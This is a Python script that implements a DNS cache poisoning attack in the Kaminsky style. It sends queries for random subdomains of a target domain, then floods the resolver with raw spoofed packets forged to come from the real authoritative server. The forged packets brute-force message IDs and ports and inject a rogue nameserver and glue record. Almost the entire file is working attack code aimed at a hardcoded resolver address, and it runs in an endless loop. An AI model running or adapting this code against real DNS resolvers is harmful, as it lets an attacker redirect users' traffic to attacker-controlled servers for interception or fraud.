#!/usr/bin/python3
# # Imports
import socket
import random
from scapy.layers.dns import DNS
from scapy.layers.inet import UDP, IP, Ether
from src.basic import BeautifulPrinter, BIG_ENDIAN, LITTLE_ENDIAN, calc_udp_checksum, ip2bytes
from src.dns_message.dns_message import DNSMessage, QUERY, RESPONSE


class MainPoisonFlow:
    def __init__(self, _target, _domain,
                _is_random, _port_scale, 
                _authority_ip, _authority_name, _fake_authority_ip,
                _count=-1):
        self.target = _target
        self.domain = _domain
        self.is_random = _is_random
        self.port_scale = _port_scale
        self.authority_ip = _authority_ip
        self.authority_name = _authority_name
        self.fake_authority_ip = _fake_authority_ip
        if not self.is_random and len(self.port_scale) == 1: 
            self.__mode = 0
            print("FLOW MODE: PORT NOT RANDOM, PORT SCALE: ", self.port_scale[0])
        else:
            print("FLOW MODE: PORT RANDOM, PORT SCALE LENGTH: ", len(self.port_scale))
            self.__mode = 1 
        self.send_count = _count

    def get_base_dns_message(self, _labels):
        _dns_query_message = DNSMessage(_type=QUERY)
        _dns_query_message.message_id = random.randint(0, 0xffff)
        _dns_query_message.set_numbers(_flags=0x0100, _question_rrs=1, _answers_rrs=0, _auth_rrs=0, _addi_rrs=0,
                                    _query={
                                        'labels': _labels,
                                        'type': 1,
                                        'class': 1
                                    })
        _query = _dns_query_message.to_bytes()
        # # 构造response
        _dns_response_message = DNSMessage(_type=RESPONSE)
        _dns_response_message.set_numbers(_flags=0x8400, _question_rrs=1, _answers_rrs=1, _auth_rrs=1, _addi_rrs=1,
                                        _query={
                                            'labels': _labels,
                                            'type': 1,
                                            'class': 1
                                        })
        _dns_response_message.answers.append({
            'name': '.'.join(_labels),
            'type': 1,
            'class': 1,
            "ttl": 208,
            "data_length": 4,
            "address": "1.1.1.1"
        })
        _dns_response_message.authoritative_nameservers.append({
            'name': self.domain,
            "type": 2,
            "class": 1,
            "ttl": 208,
            "data_length": 4,
            "address": self.authority_name
        })
        _dns_response_message.additional_records.append({
            'name': self.authority_name,
            "type": 1,
            "class": 1,
            "ttl": 208,
            "data_length": 4,
            "address": self.fake_authority_ip
        })
        # # 构造链路层response包
        _dns_message_response = _dns_response_message.to_bytes()
        _pkt = Ether()/IP(dst=self.target, src=self.authority_ip) / UDP(dport=self.port_scale[0], sport=53) / DNS(_dns_message_response)
        _response = _pkt.build()
        return _query, _response

    def flow(self):
        """
            定制不同的攻击需求
        """
        print("Please Press Ctrl+C to cancel...")
        _charset = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
        try:
            _simple_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            _raw_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
            _raw_socket.bind(("ens160", 0))
        except Exception as e:
            print("创建套接字失败")
            raise e
        try:
            while self.send_count != 0:
                try:
                    self.send_count -= 1
                    # # 构造随机域名
                    _labels = [''.join([_charset[random.randint(0, len(_charset) - 1)] for _ in range(5)])] + self.domain.split('.')
                    # # 构造query和response
                    _query, _response = self.get_base_dns_message(_labels)
                    # # 发送query和response
                    if self.__mode == 0:
                        # # 生成message id
                        _message_id = list(range(0, 65536))
                        random.shuffle(_message_id)
                        _message_id_seq = _message_id[0: 5000]
                        _simple_sock.sendto(_query, (self.target, 53))
                        for _p in self.port_scale:
                            for _id in _message_id_seq:
                                _new_dns_message = int(_id).to_bytes(2, 'big') + _response[44:]
                                _response = _response[:40] + calc_udp_checksum(_src=self.authority_ip, _dst=self.target, _sport=53, _dport=_p, _payload=_new_dns_message) + _new_dns_message
                                _raw_socket.send(_response)
                    elif self.__mode == 1:
                        """
                            Algorithm 1:
                                generate and send thousands of fake packets by (port, message_id), for example
                                _tuple = []
                                for _ in range(5000):
                                    _tuple.append((random.randint(1024, 65535), random.randint(0, 65535)))
                                for _port, _message_id in _tuple:
                                    make_fake_message(_base_dns_response, _port, _message)      # # need re-calculate the checksum in udp header
                            Algorithm 2:
                                generate and send thousands of fake packets with message_id and special port, for example 
                                _ports = list(range(1024, 65536))
                                _message_ids = list(range(0, 65535))
                                shuffle(_ports)
                                shuffle(_message_ids)
                                for _port in _ports[:500]:
                                    for _message_id in _message_id[:500]:
                                        make_fake_message(_base_dns_response, _port, _message)      # # need re-calculate the checksum in udp header
                            In fact, in this situation, python is not useful, it's too slow. But we need try.
                        """
                        _message_id = list(range(0, 65536))
                        random.shuffle(_message_id)
                        random.shuffle(self.port_scale)
                        _message_id_seq = _message_id[0: 50]
                        _port_seq = self.port_scale[0: 100]
                        """以下过程可以加快, 是以空间换时间, 但是还是很慢"""
                        # _response_set = []
                        # for _p in _port_seq:
                        #     for _id in _message_id_seq:
                        #         _new_dns_message = int(_id).to_bytes(2, 'big') + _response[44:] 
                        #         _response = _response[:36] + int(_p).to_bytes(2, 'big') + _response[38:40] + calc_udp_checksum(_src=self.authority_ip, _dst=self.target, _sport=53, _dport=_p, _payload=_new_dns_message) + _new_dns_message
                        #         _response_set.append(_response)
                        _simple_sock.sendto(_query, (self.target, 53))
                        # for _response in _response_set:
                        #     _raw_socket.send(_response)
                        for _p in _port_seq:
                            for _id in _message_id_seq:
                                _new_dns_message = int(_id).to_bytes(2, 'big') + _response[44:] 
                                _response = _response[:36] + int(_p).to_bytes(2, 'big') + _response[38:40] + calc_udp_checksum(_src=self.authority_ip, _dst=self.target, _sport=53, _dport=_p, _payload=_new_dns_message) + _new_dns_message
                                _raw_socket.send(_response)
                    print("Sent OK!", '.'.join(_labels))
                except KeyboardInterrupt:
                    print("User Aborted!")
                    break
                except Exception as e:
                    print("ERROR", e.__class__, e.__doc__)
                    raise e
        finally:
            _simple_sock.close()
            _raw_socket.close()


if __name__ == "__main__":
    mpf = MainPoisonFlow(_target="10.236.160.43", _domain="example.com", 
                        _is_random=True, _port_scale=list(range(33333, 33334)), 
                        _authority_ip='199.43.135.53',
                        _authority_name="makechinagreatagain.top",
                        _fake_authority_ip="1.1.1.1",
                        _count=-1)
    mpf.flow()
